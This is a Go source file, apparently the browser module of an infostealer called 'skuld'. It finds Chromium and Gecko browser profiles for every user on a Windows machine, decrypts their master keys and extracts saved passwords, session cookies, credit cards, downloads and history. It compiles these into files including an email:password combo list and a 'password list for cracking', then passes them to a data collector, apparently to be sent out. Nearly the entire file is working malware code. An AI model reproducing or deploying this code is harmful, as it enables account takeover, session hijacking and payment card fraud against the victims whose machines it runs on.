package browsers

import (
	"fmt"
	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/collector"
	"os"
	"path/filepath"
	"strings"
)

func ChromiumSteal() []Profile {
	var prof []Profile
	for _, user := range hardware.GetUsers() {
		for name, path := range GetChromiumBrowsers() {
			path = filepath.Join(user, path)
			if !fileutil.IsDir(path) {
				continue
			}

			browser := Browser{
				Name: name,
				Path: path,
				User: strings.Split(user, "\\")[2],
			}

			var profilesPaths []Profile
			if strings.Contains(path, "Opera") {
				profilesPaths = append(profilesPaths, Profile{
					Name:    "Default",
					Path:    browser.Path,
					Browser: browser,
				})

			} else {
				folders, err := os.ReadDir(path)
				if err != nil {
					continue
				}
				for _, folder := range folders {
					if folder.IsDir() {
						dir := filepath.Join(path, folder.Name())
						if fileutil.Exists(filepath.Join(dir, "Web Data")) {
							profilesPaths = append(profilesPaths, Profile{
								Name:    folder.Name(),
								Path:    dir,
								Browser: browser,
							})
						}

					}
				}
			}

			if len(profilesPaths) == 0 {
				continue
			}

			c := Chromium{}
			err := c.GetMasterKey(path)
			if err != nil {
				continue
			}
			for _, profile := range profilesPaths {
				profile.Logins, _ = c.GetLogins(profile.Path)
				profile.Cookies, _ = c.GetCookies(profile.Path)
				profile.CreditCards, _ = c.GetCreditCards(profile.Path)
				profile.Downloads, _ = c.GetDownloads(profile.Path)
				profile.History, _ = c.GetHistory(profile.Path)
				prof = append(prof, profile)
			}

		}
	}
	return prof
}

func GeckoSteal() []Profile {
	var prof []Profile
	for _, user := range hardware.GetUsers() {
		for name, path := range GetGeckoBrowsers() {
			path = filepath.Join(user, path)
			if !fileutil.IsDir(path) {
				continue
			}

			browser := Browser{
				Name: name,
				Path: path,
				User: strings.Split(user, "\\")[2],
			}

			var profilesPaths []Profile

			profiles, err := os.ReadDir(path)
			if err != nil {
				continue
			}
			for _, profile := range profiles {
				if !profile.IsDir() {
					continue
				}
				dir := filepath.Join(path, profile.Name())
				files, err := os.ReadDir(dir)
				if err != nil {
					continue
				}
				if len(files) <= 10 {
					continue
				}

				profilesPaths = append(profilesPaths, Profile{
					Name:    profile.Name(),
					Path:    dir,
					Browser: browser,
				})
			}

			if len(profilesPaths) == 0 {
				continue
			}

			for _, profile := range profilesPaths {
				g := Gecko{}
				g.GetMasterKey(profile.Path)
				profile.Logins, _ = g.GetLogins(profile.Path)
				profile.Cookies, _ = g.GetCookies(profile.Path)
				profile.Downloads, _ = g.GetDownloads(profile.Path)
				profile.History, _ = g.GetHistory(profile.Path)
				prof = append(prof, profile)
			}

		}
	}
	return prof
}

func Run(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "browsers-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	var profiles []Profile
	profiles = append(profiles, ChromiumSteal()...)
	profiles = append(profiles, GeckoSteal()...)

	if len(profiles) == 0 {
		return
	}

	// Create master password files
	allPasswordsFile := filepath.Join(tempDir, "ALL_PASSWORDS.txt")
	emailPasswordFile := filepath.Join(tempDir, "EMAIL_PASSWORD_LIST.txt")
	passwordListFile := filepath.Join(tempDir, "PASSWORD_LIST.txt")
	
	fileutil.AppendFile(allPasswordsFile, "🔐 ALL EXTRACTED PASSWORDS\n")
	fileutil.AppendFile(allPasswordsFile, "===========================\n\n")
	fileutil.AppendFile(allPasswordsFile, fmt.Sprintf("%-60s %-40s %-40s %-20s", "URL", "USERNAME/EMAIL", "PASSWORD", "BROWSER"))
	fileutil.AppendFile(allPasswordsFile, strings.Repeat("=", 160))

	fileutil.AppendFile(emailPasswordFile, "📧 EMAIL:PASSWORD COMBINATIONS\n")
	fileutil.AppendFile(emailPasswordFile, "================================\n\n")

	fileutil.AppendFile(passwordListFile, "🔑 PASSWORD LIST FOR CRACKING\n")
	fileutil.AppendFile(passwordListFile, "===============================\n\n")

	totalLogins := 0
	totalCookies := 0
	totalCards := 0
	totalHistory := 0
	totalDownloads := 0
	passwordSet := make(map[string]bool) // To avoid duplicate passwords

	for _, profile := range profiles {
		if len(profile.Logins) == 0 && len(profile.Cookies) == 0 && len(profile.CreditCards) == 0 && len(profile.Downloads) == 0 && len(profile.History) == 0 {
			continue
		}
		
		profileDir := filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name)
		os.MkdirAll(profileDir, os.ModePerm)

		// Process logins
		if len(profile.Logins) > 0 {
			loginsFile := filepath.Join(profileDir, "logins.txt")
			fileutil.AppendFile(loginsFile, fmt.Sprintf("%-60s %-40s %-40s", "URL", "USERNAME", "PASSWORD"))
			fileutil.AppendFile(loginsFile, strings.Repeat("=", 140))
			
			for _, login := range profile.Logins {
				loginLine := fmt.Sprintf("%-60s %-40s %-40s", login.LoginURL, login.Username, login.Password)
				fileutil.AppendFile(loginsFile, loginLine)
				
				// Add to master passwords file
				passwordLine := fmt.Sprintf("%-60s %-40s %-40s %-20s", login.LoginURL, login.Username, login.Password, profile.Browser.Name)
				fileutil.AppendFile(allPasswordsFile, passwordLine)
				
				// Add to email:password list if it looks like an email
				if strings.Contains(login.Username, "@") {
					emailPassLine := fmt.Sprintf("%s:%s", login.Username, login.Password)
					fileutil.AppendFile(emailPasswordFile, emailPassLine)
				} else if login.Username != "" && login.Password != "" {
					// Also add username:password combinations
					userPassLine := fmt.Sprintf("%s:%s", login.Username, login.Password)
					fileutil.AppendFile(emailPasswordFile, userPassLine)
				}

				// Add unique passwords to password list
				if login.Password != "" && !passwordSet[login.Password] {
					passwordSet[login.Password] = true
					fileutil.AppendFile(passwordListFile, login.Password)
				}
				
				totalLogins++
			}
		}

		// Process cookies
		if len(profile.Cookies) > 0 {
			cookiesFile := filepath.Join(profileDir, "cookies.txt")
			fileutil.AppendFile(cookiesFile, "# Netscape HTTP Cookie File")
			fileutil.AppendFile(cookiesFile, "# This is a generated file! Do not edit.")
			fileutil.AppendFile(cookiesFile, "")
			
			for _, cookie := range profile.Cookies {
				var expires string
				if cookie.ExpireDate == 0 {
					expires = "FALSE"
				} else {
					expires = "TRUE"
				}

				var host string
				if strings.HasPrefix(cookie.Host, ".") {
					host = "FALSE"
				} else {
					host = "TRUE"
				}

				cookieLine := fmt.Sprintf("%s\t%s\t%s\t%s\t%d\t%s\t%s", cookie.Host, expires, cookie.Path, host, cookie.ExpireDate, cookie.Name, cookie.Value)
				fileutil.AppendFile(cookiesFile, cookieLine)
				totalCookies++
			}
		}

		// Process credit cards
		if len(profile.CreditCards) > 0 {
			cardsFile := filepath.Join(profileDir, "credit_cards.txt")
			fileutil.AppendFile(cardsFile, "💳 CREDIT CARDS FOUND")
			fileutil.AppendFile(cardsFile, "===================")
			fileutil.AppendFile(cardsFile, fmt.Sprintf("%-20s %-15s %-15s %-30s %-50s", "NUMBER", "EXP_MONTH", "EXP_YEAR", "NAME", "ADDRESS"))
			fileutil.AppendFile(cardsFile, strings.Repeat("=", 130))
			
			for _, cc := range profile.CreditCards {
				cardLine := fmt.Sprintf("%-20s %-15s %-15s %-30s %-50s", cc.Number, cc.ExpirationMonth, cc.ExpirationYear, cc.Name, cc.Address)
				fileutil.AppendFile(cardsFile, cardLine)
				totalCards++
			}
		}

		// Process downloads
		if len(profile.Downloads) > 0 {
			downloadsFile := filepath.Join(profileDir, "downloads.txt")
			fileutil.AppendFile(downloadsFile, "📥 DOWNLOAD HISTORY")
			fileutil.AppendFile(downloadsFile, "==================")
			fileutil.AppendFile(downloadsFile, fmt.Sprintf("%-80s %-80s", "TARGET PATH", "URL"))
			fileutil.AppendFile(downloadsFile, strings.Repeat("=", 160))
			
			for _, download := range profile.Downloads {
				downloadLine := fmt.Sprintf("%-80s %-80s", download.TargetPath, download.URL)
				fileutil.AppendFile(downloadsFile, downloadLine)
				totalDownloads++
			}
		}

		// Process history
		if len(profile.History) > 0 {
			historyFile := filepath.Join(profileDir, "history.txt")
			fileutil.AppendFile(historyFile, "🌐 BROWSING HISTORY")
			fileutil.AppendFile(historyFile, "==================")
			fileutil.AppendFile(historyFile, fmt.Sprintf("%-80s %-80s %-15s", "TITLE", "URL", "VISIT_COUNT"))
			fileutil.AppendFile(historyFile, strings.Repeat("=", 175))
			
			for _, history := range profile.History {
				historyLine := fmt.Sprintf("%-80s %-80s %-15d", history.Title, history.URL, history.VisitCount)
				fileutil.AppendFile(historyFile, historyLine)
				totalHistory++
			}
		}
	}

	// Add summary to master files
	summary := fmt.Sprintf("\n\n📊 SUMMARY\n==========\nTotal Logins: %d\nTotal Cookies: %d\nTotal Credit Cards: %d\nTotal History: %d\nTotal Downloads: %d\nTotal Profiles: %d\nUnique Passwords: %d", 
		totalLogins, totalCookies, totalCards, totalHistory, totalDownloads, len(profiles), len(passwordSet))
	
	fileutil.AppendFile(allPasswordsFile, summary)
	fileutil.AppendFile(emailPasswordFile, fmt.Sprintf("\n\nTotal combinations: %d", totalLogins))
	fileutil.AppendFile(passwordListFile, fmt.Sprintf("\n\nTotal unique passwords: %d", len(passwordSet)))

	// Add browsers data to collector
	browsersInfo := map[string]interface{}{
		"TotalLogins":      totalLogins,
		"TotalCookies":     totalCookies,
		"TotalCreditCards": totalCards,
		"TotalHistory":     totalHistory,
		"TotalDownloads":   totalDownloads,
		"ProfilesFound":    len(profiles),
		"UniquePasswords":  len(passwordSet),
		"TreeView":         fileutil.Tree(tempDir, ""),
	}
	dataCollector.AddData("browsers", browsersInfo)
	dataCollector.AddDirectory("browsers", tempDir, "browsers_data")
}